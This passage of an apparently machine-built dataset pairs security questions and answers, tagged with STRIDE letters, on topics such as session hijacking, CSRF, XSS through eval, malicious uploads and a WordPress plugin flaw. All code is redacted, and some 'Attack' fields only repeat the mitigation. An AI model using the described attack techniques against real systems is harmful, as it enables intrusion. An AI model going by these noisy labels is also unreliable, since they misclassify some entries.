    "Attack": " A security issue may arise when a malicious user steals the [CODE] of an other user. Without some kind of check, he will then be free to impersonate that user. We need to find a way to uniquely identify the client (not the user). ",
    "Mitigation": " One strategy (the most effective) involves checking if the IP of the client who started the session is the same as the IP of the person using the session.  [CODE]  The problem with that strategy is that if a client uses a load-balancer, or (on long duration session) the user has a dynamic IP, it will trigger a false alert.  Another strategy involves checking the user-agent of the client:  [CODE]  The downside of that strategy is that if the client upgrades it's browser or installs an addon (some adds to the user-agent), the user-agent string will change and it will trigger a false alert.  Another strategy is to rotate the [CODE] on each 5 requests. That way, the [CODE] theoretically doesn't stay long enough to be hijacked.  [CODE]  You may combine each of these strategies as you wish, but you will also combine the downsides.  Unfortunately, no solution is fool-proof. If your [CODE] is compromised, you are pretty much done for. The above strategies are just stop-gap measures. "
  },
  {
    "Threat": "T",
    "Attack": " The daemon will pick up actions from a queue and execute them. However, since I'll be accepting input from users, I want to make sure they're not permitted to inject something dangerous into a privileged shell command. ",
    "Mitigation": " It doesn't look like you need a shell for what you're doing.  See the documentation for [CODE] here: [LINK]  You should use the second form of [CODE].  Your example above would become:  [CODE]  A nicer (IMO) way to write this is:  [CODE]  The arguments this way are passed directly into the [CODE] call, so you don't have to worry about sneaky shell tricks. "
  },
  {
    "Threat": "T",
    "Attack": " The code below uses an unsafe [CODE] extension to break [CODE] by inserting different elements with different [CODE] instances: ",
    "Mitigation": " I think that's an important question, so I'll repeat my answer from elsewhere: you can have multiple instances of the same class for the same type in Haskell98 without any extensions at all:  [CODE]  And yes, you can prevent this kind of attacks by storing the dictionary internally:  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " The attacker is going to apply an [LINK] the iframe after the widget has loaded.  This mask will make the iframe invisible.   At this point the attacker can either resize the iframe to be the size of the page or have this now invisible iframe follow the cursor.  Either way whenever the user clicks anywhere on the page,  the iframe receives the click event and its game over.  ",
    "Mitigation": " Clicking on the widget needs to open a pop-up window containing a new page -- an iframe is not good enough, it must be a new window -- which is entirely under the control of your web application.  Confirm the action, whatever it is, on that page.  Yes, this is somewhat inelegant, but the present Web security architecture doesn't give you any better options. "
  },
  {
    "Threat": "T",
    "Attack": " [CODE]  But as I've read a lot, I have seen that to use [CODE] is unsafe, as the comment below highlights:     Do NOT use the above code unless you know EXACTLY what it does! I've  seen MASSIVE security holes due to this. The client can set the  X-Forwarded-For or the Client-IP header to any arbitrary value it  wants. Unless you have a trusted reverse proxy, you shouldn't use any  of those values.  I've tried the simple [CODE], but this returns the wrong IP. I've tested this and my real IP follows this pattern: [CODE], but I get an IP address like: [CODE]  Short answer:[CODE]<hr />As of 2021 (and still) [CODE] is the only reliable way to get users ip address, but it can show erroneous results if behind a proxy server.<br />All other solutions imply security risks or can be easily faked. ",
    "Mitigation": " Short answer:[CODE]<hr />As of 2021 (and still) [CODE] is the only reliable way to get users ip address, but it can show erroneous results if behind a proxy server.<br />All other solutions imply security risks or can be easily faked. "
  },
  {
    "Threat": "T",
    "Attack": " Someone uploaded several GIFs, which when viewed with a browser, the browser said it was invalid, and my virus scanner alerted me that it was a injection.  See below for a zip file containing these GIFs. ",
    "Mitigation": " As for the first question, you'll never really know if you're not able to retrieve any logs or the images in question, because there are many things these exploit may have targeted and depending on what's the target the way the exploit was put into the file can be completely different.  Edit: W32/Graftor is a [LINK] for programs that appear to have trojan-like characteristics.  After opening the file [CODE] in a hex editor, I noticed the program is actually a [LINK]. Although it's not a browser exploit and thus harmless unless it's actually opened and executed, you'll have to make sure it isn't served with the MIME type defined by the uploader because a user may still be tricked into opening the program; see the answer to the second question.  As for the second question: to prevent any exploit code from being run or a user, you'll have to make sure all files are stored with a safe extension in the filename so they are served with the correct MIME type. For example, you can use this regular expression to check the file name:  [CODE]  Also make sure you're serving the files with the correct Content Type; make sure you don't use the content type specified with the uploaded file when serving the file to the user. If you rely on the Content-Type specified by the uploader, the file may be served as [CODE] or anything similar and will be parsed by the users' browser as such.  Please note that this only protects against malicious files exploiting vulnerabilities in the users' browser, the image parser excluded.  If you're trying to prevent exploits against the server you'll have to make sure that you won't let the PHP parser execute the contents of the image and that the image library you are using to process the image does not have any known vulnerabilities.  Also note that this code does not defend you against images that contain an exploit for the image parser used by the users browser; to defend against this, you can check if [CODE] evaluates to true as suggested by Jeroen.  Note that using [CODE] alone isn't sufficient if you don't check file names and make sure files are served with the correct [CODE] header, because completely valid images can have HTML / PHP code embedded inside comments. "
  },
  {
    "Threat": "I",
    "Attack": " inspect any (user) process memoryread local (user) files ",
    "Mitigation": "On to specific answers:    How does one securely store authentication credentials using python?   If storing a password for the application to authenticate the user, use a PBKDF2 algorithm, such as [LINK]If storing a password/security token to access another service, then there is no absolutely secure way.However, consider switching authentication strategies to, for example the smartcard, using, eg, [LINK]. You can use smartcards to both authenticate a user to the application, and also securely authenticate the application to another service with X.509 certs.    Can something be done about the language \"everything is public\" philosophy? I know \"we're all consenting adults here\", but should we be forced to choose between sharing our passwords with an attacker and using another language?  IMHO there is nothing wrong with writing a specific module in Python that does it's damnedest to hide the secret information, making it a right bugger for others to reuse (annoying other programmers is its purpose). You could even code large portions in C and link to it. However, don't do this for other modules for obvious reasons.  Ultimately, though, if the hacker has control over the computer, there is no privacy on the computer at all. Theoretical worst-case is that your program is running in a VM, and the hacker has complete access to all memory on the computer, including the BIOS and graphics card, and can step your application though authentication to discover its secrets.  Given no absolute privacy, the rest is just obfuscation, and the level of protection is simply how hard it is obfuscated vs. how much a skilled hacker wants the information. And we all know how [LINK], even for [LINK] and [LINK].    Using Python keyring  While this will quite securely manage the key with respect to other applications, all Python applications share access to the tokens. This is not in the slightest bit secure to the type of attack you are worried about. "
  },
  {
    "Threat": "I",
    "Attack": " I want to stop search engines from crawling my whole website. ",
    "Mitigation": " It is best handled with a [LINK] file, for just bots that respect the file.  To block the whole site add this to [CODE] in the root directory of your site:  [CODE]  To limit access to your site for everyone else, [CODE] is better, but you would need to define access rules, by IP address for example.  Below are the [CODE] rules to restrict everyone except your people from your company IP:  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " The security concerns you should have are mainly from using [CODE] and [CODE] runners.  [CODE] is unsafe unless you're in a controlled environment.This is because it's, literally, a simple shell. The user running your build will have access to everything else going on for that user, and that includes other projects.[CODE] is susceptible to man-in-the-middle attacks.If you're dealing with private crypto keys in your builds, beware that they may be stolen.  Fortunately, [LINK] seems to be sharing only [CODE] runners.[CODE] runners are generally safe* because every build runs in a new container, so there's nothing to worry.  * unless you're doing the nasty [CODE] mode! ",
    "Mitigation": " Fortunately, [LINK] seems to be sharing only [CODE] runners.[CODE] runners are generally safe* because every build runs in a new container, so there's nothing to worry.  You can read further [LINK]. "
  },
  {
    "Threat": "I",
    "Attack": "   In cryptography, a timing attack is a side channel attack in which the  attacker attempts to compromise a cryptosystem by analyzing the time  taken to execute cryptographic algorithms. ",
    "Mitigation": " Actually, to prevent timing attacks, you can use the following function taken from [LINK]:  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " A hacker can access hidden fields just as easily as querystring values by using an intercepting proxy (or any number of tools). ",
    "Mitigation": " I dont think there is anything wrong with using hidden fields as long as they aren't used for anything sensitive and you validate them like you would any other value from the client. "
  },
  {
    "Threat": "S",
    "Attack": " The major security flaw I can see is replay attacks. How do I prevent someone from getting ahold of that encrypted string, and POSTing as that user? I know I can use SSL to make it harder to steal that string, and maybe I can rotate the encryption key on a regular basis to limit the amount of time that the string is good for, but I'd really like to find a bulletproof solution. Anybody have any ideas? Does the ASP.Net ViewState prevent replay? If so, how do they do it?  If you hash in a time-stamp along with the user name and password, you can close the window for replay attacks to within a couple of seconds. I don't know if this meets your needs, but it is at least a partial solution. ",
    "Mitigation": " If you hash in a time-stamp along with the user name and password, you can close the window for replay attacks to within a couple of seconds. I don't know if this meets your needs, but it is at least a partial solution. "
  },
  {
    "Threat": "I",
    "Attack": " If an attacker gets ahold of the data in the datastore, as well as our hash salt, I'm worried they could brute force the sensitive data.  ",
    "Mitigation": " When deciding on a security architecture, the first thing in your mind should always be threat models. Who are your potential attackers, what are their capabilities, and how can you defend against them? Without a clear idea of your threat model, you've got no way to assess whether or not your proposed security measures are sufficient, or even if they're necessary.  From your text, I'm guessing you're seeking to protect against some subset of the following:  An attacker who compromises your datastore data, but not your application code.An attacker who obtains access to credentials to access the admin console of your app and can deploy new code.  For the former, encrypting or hashing your datastore data is likely sufficient (but see the caveats later in this answer). Protecting against the latter is tougher, but as long as your admin users can't execute arbitrary code without deploying a new app version, storing your keys in a module that's not checked in to source control, as you suggest, ought to work just fine, since even with admin access, they can't recover the keys, nor can they deploy a new version that reveals the keys to them. Make sure to disable downloading of source, obviously.  You rightly note some concerns about hashing of data with a limited amount of entropy - and you're right to be concerned. To some degree, salts can help with this by preventing precomputation attacks, and key stretching, such as that employed in PBKDF2, scrypt, and bcrypt, can make your attacker's life harder by increasing the amount of work they have to do. However, with something like SSN, your keyspace is simply so small that no amount of key stretching is going to help - if you hash the data, and the attacker gets the hash, they will be able to determine the original SSN.  In such situations, your only viable approach is to encrypt the data with a secret key. Now your attacker is forced to brute-force the key in order to get the data, a challenge that is orders of magnitude harder.  In short, my recommendation would be to encrypt your data using a standard (private key) cipher, with the key stored in a module not in source control. Using hashing instead will only weaken your data, while using public key cryptography doesn't provide appreciable security against  "
  },
  {
    "Threat": "I",
    "Attack": " Now, the question is - is it a safe approach regarding the reverse engineering? For now I can think of no other possibility to get this data. But if someone is able to decompile my apk, he will be also able to retrieve this \"someSecretPhrase\" (rather hard to do on the server side) and then access the server, isn't he? Is it a real threat? Is there any other possibility to authenticate my app by the server? ",
    "Mitigation": " Android requires that one should [LINK] their app(signing authority or self signed) before it can be installed. We can utilize this to check whether requests are coming from your app or not.  Sign your app with your certificate.[LINK] the certificates signature and save it in your backend server.For every request, expect this signature to be sent by the app.validate the signature sent by the app at server level and accept only if they matches.  Even in that case where someone tampers with your app, he has to sign it again before it can be installed, which would change the apps signature and our validation mechanism would simple reject all such requests.  This answer is based on [LINK] blog. Use https for app&lt;->server communication. "
  },
  {
    "Threat": "T",
    "Attack": " Regarding the POODLE vulnerability, if I understand it correctly, it requires a client that automatically downgrades TLS protocol to SSLv3 when failing to establish a secure channel with a server using higher version protocol advertised by the server. ",
    "Mitigation": " Apache HttpClient does not implement any of the TLS protocol aspects. It relies on JSSE APIs to do TLS/SSL handshaking and to establish secure SSL sessions. With the exception of SSL hostname verification logic, as far as TLS/SSL is concerned Apache HttpClient is as secure (or as vulnerable) as the JRE it is running in.     Update: HttpClient 4.3 by default always uses TLS, so, unless one explicitly configures it to use SSLv3 HttpClient should not be vulnerable to exploits based on POODLE.   This turned out to be wrong. One MUST explicitly remove SSLv3 from the list of supported protocols!    [CODE]  Update 2: As of version 4.3.6 HttpClient disables all versions of SSL (including SSLv3) by default. "
  },
  {
    "Threat": "E",
    "Attack": " For instance if my website allows the users to upload a profile picture, and one user uploads something harmful instead, what could happen? What kind of security should I set up to prevent attacks like this? ",
    "Mitigation": " Your first line of defense will be to limit the size of uploaded files, and kill any transfer that is larger than that amount.  File extension validation is probably a good second line of defense.  Type validation can be done later... as long as you aren't relying on the (user-supplied) mime-type for said validation.  Why file extension validation?  Because that's what most web servers use to identify which files are executable.  If your executables aren't locked down to a specific directory (and most likely, they aren't), files with certain extensions will execute anywhere under the site's document root.  File extension checking is best done with a whitelist of the file types you want to accept.  Once you validate the file extension, you can then check to verify that said file is the type its extension claims, either by checking for magic bytes or using the unix file command.  I'm sure there are other concerns that I missed, but hopefully this helps. "
  },
  {
    "Threat": "I",
    "Attack": " The only advantage in using insecure, is that you don't prompt the user when creating a communication channel (this one would be an easy prey \"Man in the middle\" attacks), but that doesn't mean that it will always work. Here's a [LINK] where the user complains about some devices asks for pairing while others don't.<br/><br/> ",
    "Mitigation": " The only advantage in using insecure, is that you don't prompt the user when creating a communication channel (this one would be an easy prey \"Man in the middle\" attacks), but that doesn't mean that it will always work. Here's a [LINK] where the user complains about some devices asks for pairing while others don't.<br/><br/>  This answer your second question, you should stick with the Secure. When developing ('cause you can't know for sure if it's going to work) and for security reasons when using an app.  "
  },
  {
    "Threat": "E",
    "Attack": " However, I do not understand the concerns about security vulnerabilities. Certainly, running [CODE] gives the hacker the ability to run any JavaScript code that you can run. ",
    "Mitigation": " As B-Con mentioned, the attacker is not the one sitting at the computer so could be using the [CODE] already in your script as a means to pass malicious code to your site in order to exploit the current user's session in someway (e.g. a user following a malicious link).  The danger of [CODE] is when it is executed on unsanitised values, and can lead to a [LINK] vulnerability.  e.g. consider the following code in your HTML (rather contrived, but it demonstrates the issue I hope)  [CODE]  Now if the query string is [CODE] you simply get an alert dialog stating the following: [CODE]  But what this code will allow a user to do is redirect users from their site to a URL such as [CODE], where www.example.com is your website.  This modifies the code that is executed by [CODE] to   [CODE]  (New lines added by me for clarity). Now this could be doing something more malicious than showing the current cookie value, as the required code is simply passed on the query string by the attacker's link in encoded form. For example, it could be sending the cookie to the attacker's domain in a resource request, enabling the authentication session to be hijacked.  This applies to any value from user/external input that is unsanitised and executed directly in the [CODE], not just the query string as shown here. "
  },
  {
    "Threat": "I",
    "Attack": " Is my data safe if I pair the phone to the device? - I suppose so, though I understand that the pairing process itself is flawed, so it is theoretically possible for some man-in-the-middle (MITM) to sniff the encryption keys during the pairing process and thus compromise the connection.I need each device to be paired to several phones (but only communicating to one at a time). What's the maximum number of pairings pr. device? - unfortunately I need to pair a rather large number of phones to my device(s).Can I perhaps get the pairing data (Long term keys etc.) from the device and store it on some external memory, to increase this limit.Can I make a safe data connection to the device without pairing, or maybe by re-pairing when I need to do so? - How safe is this procedure with regards to MITM attacks? ",
    "Mitigation": " here's my two cents:  AFAIK, BLE pairing/encryption process is not flawed. There are however three levels of MITM protection available with encryption:  None, this uses a known key == 0, so if an eavesdropper catches all your packets in the pairing process, he can follow your encrypted connection. Low MITM protection, this is when you use a user input pass key for pairing, with key &lt; 1.000.000. Here the eavesdropper would only need to try a million keys.High MITM protection, using an out-of-band key. This would give a full 128-bit strength for your encryption, and an eavesdropper would need to know the key to follow the conversation even if catching the whole pairing process. As there is no key-exchange method in BLE (yet, at least), the weakest point here would be the key distribution, but that would be the same problem as when having an additional layer of encryption at the application level. This is implementation dependant. Your device doesn't have to bond, i.e. establish a permanent relationship with the host. If the devices don't bond, there is no state telling about earlier connections (other than exchanged data, but that is application domain, not BLE stack). If the devices are not bonded, they would have to pair again the next time they connect to exchange protected data. If the devices are bonded, the encrypted connection can be continued without app/user interaction, with the same security level as earlier. For one-time-connect devices, bonding doesn't make sense, so you can have a stateless implementation with no restrictions on number of connected devices. For multiple-times-connect, you could also have a stateless implementation, depending on how you distribute/store the key(s) which is then independent of BLE. The availability of the different options here depends on the device/BLE stack implementation you are using, though, but the spec allows all this.If you bond and thus exchange long term keys etc, these can, dependent on the BLE implementation you're building on, be stored however you like. As I said under 2., you can establish a secure (encrypted) connection without bonding. The devices then need to pair again the next time they want to establish a secure connection. If you don't want to/aren't able to pair for some reason, then you can have only plaintext communication. "
  },
  {
    "Threat": "T",
    "Attack": " About an hour ago a Wordpress Page I manage started redirecting to Ad/Malware Pages.  The snippet was embedded in wp_options in an entry with the key 'yuzo_related_post_options' - more specifically embedded in the json option 'yuzo_related_post_css_and_style' of the option_value. That option gets echoed without sanitizing. ",
    "Mitigation": " I do believe I just found it:The Yuzo Related Posts Plugin does not check for authentication when saving options.   So POSTing  [CODE]  to [CODE] will succeed, even if you're not logged in.  The Plugin is using [CODE] to check for authentication, but that is a \"false friend\" and only checks if the accessed page is in the admin-area, not if a user is authenticated (nor authorized). See the [LINK].  A quick solution to keep using the plugin is just removing the settings option by putting false in the if-Statement in [CODE] line 1155:  [CODE]  Update:  Hang Guan pointed to [LINK], seems like it is \"out in the wild\" now. "
  },
  {
    "Threat": "I",
    "Attack": " So naturally, I thought of just SHA hashing it since we're just using it for identification.  The problem with that is that if an attacker knows the problem domain (an SSN), then they can focus on that domain.  So it's much easier to calculate the billion SSNs rather than a virtually unlimited number of passwords.  I know I should use a site salt and a per-patient salt, but is there anything else I can do to prevent an attacker from revealing the SSN?  Instead of SHA, I was planning on using BCrypt, since Ruby has a good library and it handles scalable complexity and salting automagically. ",
    "Mitigation": " The algorithm for generating Social Security Numbers was created before the concept of a modern hacker and as a consequence they are [LINK].  Using a SSN for authentication is a very bad idea,  it really doesn't matter what cryptographic primitive you use or how large your salt value is.  At the end of the day the &quot;secret&quot; that you are trying to protect doesn't have much entropy.If you never need to know the plain text then you should use SHA-256.  SHA-256 is a very good function to use for passwords. "
  },
  {
    "Threat": "T",
    "Attack": " I was just pointed to a very interesting [LINK] ([LINK]) about a security problem calledCross Build Injection (XBI). To be clear: I am not talking about simply providing md5 or sha1 hashes for the artifacts. That is already done, but those hashes are stored in the same location as the artifacts. So once a malicious hacker compromises the repository and can replace the artifact they can replace the hashes as well.So what is acutally needed is some kind of PKI, that allows the developers to sign their artifacts and maven to verify these signatures. Since the signature is done using the private key of the developer it cannot be tampered with when only the repository is compromised.Does anyone know the state of this in maven? ",
    "Mitigation": " Update: The checksums mentioned below are indeed only for integrity checks and are indeed stored with the artifacts so they don't answer the question.   Actually, one need to sign artifacts using PGP to upload them to a repository that is synced with central (the [LINK] can help for this step). To verify signatures at download time, you are invited to use a repository manager supporting this feature. From [LINK]:    If you use a tool that downloads  artifacts from the Central Maven  repository, you need to make sure that  you are making an effort to validate  that these artifacts have a valid PGP  signature that can be verified against  a public key server.   If you don\u9225\u6a9b  validate signatures, then you have no  guarantee that what you are  downloading is the original artifact.   One way to to verify signatures on  artifacts is to use a repository  manager like Nexus Professional.  In  Nexus Professional you can configure  the procurement suite to check every  downloaded artifact for a valid PGP  signature and validate the signature  against a public keyserver.    If you are developing software using  Maven, you should generate a PGP  signature for your releases.   Releasing software with valid  signatures means that your customers  can verify that a software artifact  was generated by the original author  and that it hasn\u9225\u6a9b been modified by  anyone in transit.  Most large OSS  forges like the Apache Software  Foundation require all projects to be  released by a release manager whose  key has been signed by other members  of the organization, and if you want  to synchronize your software artifacts  to Maven central you are required to  [LINK].  <h3>See also</h3>  [LINK][LINK]     The Maven Install Plugin can be configured to [LINK] (MD5, SHA-1) and you can configure a checksum policy per repository (see [LINK]).  Maven repository managers can/should also be able to deal with them. See for example:  [LINK]  "
  },
  {
    "Threat": "S",
    "Attack": " With basic authentication the password is sent nearly plain (base64 encoded) to the server and on the server side it gets hashed and compared against the hashed password (stored in htpasswd file or similar). With digest authentication the hashed password is sent to the server (with some server defined data added so replay attacks will not work). But to verify the password you need to have the plain password on the server side (or something close to the plain password). This means, that if the attacker gets access to the htpasswd file it needs to crack all the passwords before they can be used for basic authentication, while if it gets access to the htdigest file it can use it directly for digest authentication. ",
    "Mitigation": " In summary: basic auth is less secure on the wire, but way more secure to store on the server. Best choice of both would be therefore to use basic auth with SSL. But, both authentication techniques have the disadvantage, that there is no way for a session timeout or explicit logouts, e.g. the browser will stay logged in until it gets closed. This makes attacks like CSRF easier. "
  },
  {
    "Threat": "S",
    "Attack": " Using HTTP Basic Auth does not prevent CSRF attacks via GET requests. E.g. somebody else can include an img tag in their HTML page that does a GET on some well-known URI, and your browser will happily send along the basic auth info. If the GET operation is \"safe\" (which is the #1 rule for anything claiming to be RESTful), this will not create a problem (beyond wasted bandwidth). ",
    "Mitigation": " Only including a server-generated token in the HTML you generate, and validating its presence in form submission requests, will protect you from somebody else simply including a \"foreign\" form in their pages. You might limit this to the content types generated by browsers; no need to do so for XHR requests. "
  },
  {
    "Threat": "T",
    "Attack": " The security concerns that you mention aren't, per se, about \"allowing the user to invoke Python code\" which runs with high access levels, but allowing the user to exercise any form of control over the running of such code -- most obviously by injecting or altering the code itself. ",
    "Mitigation": " It appears to me that [CODE] is well armored against such risks, and so it should be safely usable for your purposes. However, do note that [LINK] point out...: "
  },
  {
    "Threat": "S",
    "Attack": " Checking for mime type in php is pretty easy but as far as I know mime can be spoofed. The attacker can upload a php script with for example jpeg mime type. One thing that comes to mind is to check the file extension of the uploaded file and make sure it matches the mime type. All of this is assuming the upload directory is browser accessible. ",
    "Mitigation": " Short answer: No.  Longer answer:  Comparing the extension and making sure that it matches the MIME type doesn't really prevent anything. As was said in the comments, it's even easier to modify a file extension. MIME type and extension are only to be meant as hints, there's no inherent security in them.  Ensuring that incoming files do no harm is very dependent on what your purpose for them is going to be. In your case I understood that you are expecting images. So what you could do is perform some sanity checks first: scan the first couple of bytes to see if the files contain the relevant image header signatures - all relevant image formats have these.  The \"signature headers\" help you to decide what kind of image format a file tries to impersonate. In a next step you could check if the rest of the contents are compliant with the underlying image format. This would guarantee you that the file is really an image file of that specific format.  But even then, the file could be carefully crafted in a way that when you display the image, a popular library used to display that image (e.g. libpng etc.) would run into a buffer overflow that the attacker found in that library.   Unfortuantely there's no way to actively prevent this besides not allowing any input from the client side at all.  "
  },
  {
    "Threat": "I",
    "Attack": " The whole point of using salts is to avoid the possibility that someone has already precomputed a dictionary/brute force attack for your password hashes . Thus, it only needs to be long enough to exclude the possibility that such a table already exists for a specific salt. ",
    "Mitigation": " The whole point of using salts is to avoid the possibility that someone has already precomputed a dictionary/brute force attack for your password hashes . Thus, it only needs to be long enough to exclude the possibility that such a table already exists for a specific salt.  Considering the typical size of such a rainbow table, it is extremely unlikely that somebody already has precomputed such tables for salts of even small size like 8 bytes or so (consider the number of possible salts: [CODE]). The premise is of course that the salts are randomly generated and that you don't use the same salt value multiple times. 64 bytes can't hurt, of course, there's nothing wrong with that.  However, if you want to make brute-force or dictionary attacks infeasible, it won't help you to use a longer salt. Instead, make your users to choose strong passwords and consider using [LINK]. "
  },
  {
    "Threat": "S",
    "Attack": " Since I do not have control over how the static website is served, I cannot generate a CSRF token when someone loads my static website (and insert the token into forms or send it with my AJAX requests). I could create a [CODE] endpoint to retrieve the token, but it seems like an attacker could simply access that endpoint and use the token it provides?    I could create a GET endpoint to retrieve the token, but it seems like an attacker could simply access that endpoint and use the token it provides? ",
    "Mitigation": "   CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim's behalf.   It's perfectly valid to make an initial GET request on page load to get a fresh token and then submit it with the request performing an action.    If you want to confirm the identity of the person making the request you'll need authentication, which is a separate concern from CSRF. "
  },
  {
    "Threat": "E",
    "Attack": " The security world has been abuzz over a new code injection technique called \"atom bombing\" (see [LINK] and [LINK]).  Simply stated, an attacker can use atom tables to store executable code. ",
    "Mitigation": " The exploit does not allow evil code to elevate or otherwise get privileges the source process does not already have because [CODE] cannot be used on any random process, you still need the appropriate privileges to access the desired target process. [CODE] might have caught some anti-virus companies off guard when the exploit came out but as a standalone piece of code that has to be executed by someone in the first place it cannot do much damage on its own, it has to be combined with other code to be scary. "
  },
  {
    "Threat": "D",
    "Attack": " However, what if a hacker were to forge an AJAX request, and repeatedly submit the 'form_data' array with 100000000000 random elements? The loop would have to iterate through each element, possibly causing a DoS (or at least slow down service), correct? ",
    "Mitigation": " This will not be an issue: PHP limits the maximum number of POST vars using the [LINK], which defaults to 1000 variables.  This limit is actually enforced to prevent a much more serious type of DOS attack than the one you are thinking about (really, iterating a few thousand array elements is like nothing), namely hash table collision based attacks (often referred to as HashDOS). For more info on that issue see my article [LINK]. "
  },
  {
    "Threat": "D",
    "Attack": " Another thing you need to be aware of is Denial-of-Service attacks. Imagine someone whips up an Ackermann function and a script to submit it a couple of thousand times to your server... To prevent this, you should timebox the execution time of any code being submitted. This is essential, because this type of \"attack\" often happens unintentionally - someone managed to produce an infinite loop. ",
    "Mitigation": " Another thing you need to be aware of is Denial-of-Service attacks. Imagine someone whips up an Ackermann function and a script to submit it a couple of thousand times to your server... To prevent this, you should timebox the execution time of any code being submitted. This is essential, because this type of \"attack\" often happens unintentionally - someone managed to produce an infinite loop. "
  },
  {
    "Threat": "S",
    "Attack": " Both [CODE] and [CODE] are used to describe what's called a [CODE]. It's where a malicious website takes advantage of your authenticated state on another website, to perform fraudulent cross-site requests.  ",
    "Mitigation": " <h1>How do prevent it?</h1>  You use an anti-forgery token, this [CODE] is a string containing a random value, the token is placed in your [CODE], in addition to your HTML forms.   When you receive a request, you validate that the form contains an anti-forgery token and that it matches the one stored in your cookies. A malicious site can not see the tokens your website sets on a client, and without this information, XSRF attacks are stopped in their tracks.    <h1>How do I implement it in ASP.NET MVC?</h1>  On your controller Action that will be handling the request, add the attribute [CODE], and in the HTML form add [CODE].  [CODE]  That's it!     <h1>Tips/Pointers/Advice</h1>  Anti-Forgery Tokens don't make a lot of sense when performing [CODE] requests, in fact, they don't make sense to have them anywhere that you're not modifying and persisting data, as any GET request will be returned to your user, not the attacker.  "
  },
  {
    "Threat": "T",
    "Attack": " The problem is that someone managed to get a hyperlink in the text and htmlentities() does not remove it.  Now the hacker send some data and this was the result html: ",
    "Mitigation": " Nice question! I think you can read this [LINK] that explain the problem and gives a solution.  The proposed solution is to specify to the browser (through a meta tag) which charset is used in the page. "
  },
  {
    "Threat": "D",
    "Attack": " In most languages allowing users to supply regular expression means that you allow for a denial of service attack. ",
    "Mitigation": " Some types of regular expressions are extremely cpu intensive to execute. So in general it's a bad idea to allow users to enter regular expressions that will be executed on a remote system.  For more info, read this page: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " It is a calendar application, as mentioned above, and it is used only by my client's small company. Login is required to do anything, and only 5 or so people have accounts. I can guarantee none of them would try any shenanigans. I obviously can't guarantee someone got a hold of their information and did try shenanigans, though.Sadly enough, I did make this website almost 4 years ago, so I am not exactly 100% confident I protected against everything kids are trying nowadays, but I still cannot understand how an attacker could have possibly gained access to the webserver to append this javascript to my php files. ",
    "Mitigation": " A rogue HTTP Module (in IIS), or whatever the equivalent is for apache could prepend, append, or perhaps even modify content for any HTTP request, even for static files. This would suggest that the server itself has been compromised.  EDIT: If you let us know what type of web server you're using, we'll be able to make more specific suggestions for troubleshooting. "
  },
  {
    "Threat": "T",
    "Attack": " I don't believe you can hack via the URL. Someone could try to inject code into your application if you are passing parameters (either GET or POST) into your app so your avoidance is going to be very similar to what you'd do for a local application. ",
    "Mitigation": " I don't believe you can hack via the URL. Someone could try to inject code into your application if you are passing parameters (either GET or POST) into your app so your avoidance is going to be very similar to what you'd do for a local application.  Make sure you aren't adding parameters to SQL or other script executions that were passed into the code from the browser without making sure the strings don't contain any script language. Search the next for details about injection attacks for the development platform you are working with, that should yield lots of good advice and examples. "
  },
  {
    "Threat": "T",
    "Attack": " I just got hammered on a Security Audit by Deloitte on behalf of SFDC. Basically we use flex and communicate via AMF. We use FluorineFX for this (as opposed to LCDS and Blaze). We are being told that because the AMF response is not encoded andthat someone can manipulate the AMF parameters and insert Javascript that this is a XSS vulnerability. I'm struggling to understand how the AMF response back, which could echo the passed in JS in an error message, can be executed by the browser or anything else for that matter. I'm quite experienced with XSS with HTML and JS but seeing it get tagged with AMF was a bit of a surprise. I'm in touch with FluorineFx team and they are perplexed as well. ",
    "Mitigation": " You seem to have answered your own queries here.   So you have a server side implementation that takes the arguments to an amf function call and includes the input data somewhere in the returned output.   I appreciate that this is largely a theoretical attack as it involves getting the payload to be rendered by the browser and not into an amf client. Other vulnerabilities in browsers/plugins may be required to even enable this scenario. Maybe a CSRF post via the likes of a gateway.php or similar would make this pretty easy to abuse, as long as the browser processed the output as html/js.  However, unless you need the caller to be able to pass-through angle brackets into the response, just html-encode or strip them and this attack scenario dissapears.   This is interesting though. Normally one would perform output-encoding solely for the expected consumer of the data, but it is interesting to consider that the browser could often be a special case. This really is one hell of an edge-case, but i'm all for people getting into the habit of sanitising and encoding their untrusted inputs.  This reminds me, in many ways, to the way that cross-protocol injection can be used to abuse the reflection capabilities of protocols such as smtp to acheive XSS in the browser. See [LINK]  "
  },
  {
    "Threat": "E",
    "Attack": " Due to this, I'm starting to wonder what stops an arbitrary malicious app from 1) including the  fields in the manifest to have Account management access, and then then 2) from iterating through all accounts of a particular type and calling mAccountManger.getPassword(account) on them. I know that during installation, a dialog pops up with all the permissions that an app requests to use, but I don't think we can count on the average user to reject an app because it requests suspicious permissions. ",
    "Mitigation": " Account data protection is based on the Linux user id (UID) of the process making the request. (See [LINK] in the guide.) Each account is associated with an account authenticator (that has a UID), and the process calling [CODE] (or several other methods) must have the same UID as the authenticator. "
  },
  {
    "Threat": "T",
    "Attack": " Malicious code is being added to the start of the [CODE] fileRogue files are added to the server ",
    "Mitigation": " There's a couple of things you can do:  Check your logfiles for POST requests to files with weird or unfamiliar names, e.g. [CODE] - these could be backdoor scripts, especially filenames starting with a dot, thus hiding it from the (regular) filesystem. Download the complete live site and do a site-wide search for things such as [CODE], [CODE], [CODE], [CODE], [CODE], [CODE], [CODE], [CODE]Have your entire (downloaded live) site checked by running it through anti-virus software (AVG, Avast, ...)Chmod upload directories 775 instead of 777 if possible "
  },
  {
    "Threat": "S",
    "Attack": " How one can combat malicious applications which cover whole screen and pretend to be browsers, or even OS's settings windows etc? ",
    "Mitigation": " There is no technological defense against this even on the desktop. It's trivial to mimic the look of a browser and draw a green SSL lock into a fake address bar. Or you can simply include a key logger with your application to get passwords entered any application on the same system.  For mobile applications including a key logger is harder. Drawing convincing fake browser window is easy. An additional defense is the review process of an app store. An official app store as the only source of trusted apps mitigates problems like this to a certain extent.  "
  },
  {
    "Threat": "I",
    "Attack": " Heap Inspection is about sensitive information stored in the machine memory unencrypted, so that if an attacker performs a memory dump , that information is compromised. Thus, simply holding that information makes it vulnerable. ",
    "Mitigation": " One can mitigate this by storing such sensitive information in a secured manner, such as a GuardedString object instead of a String or a char array, or encrypting it and scrubbing the original short after.  For more information, see [LINK] (describes C/C++ but same relevancy for Java).  "
  },
  {
    "Threat": "T",
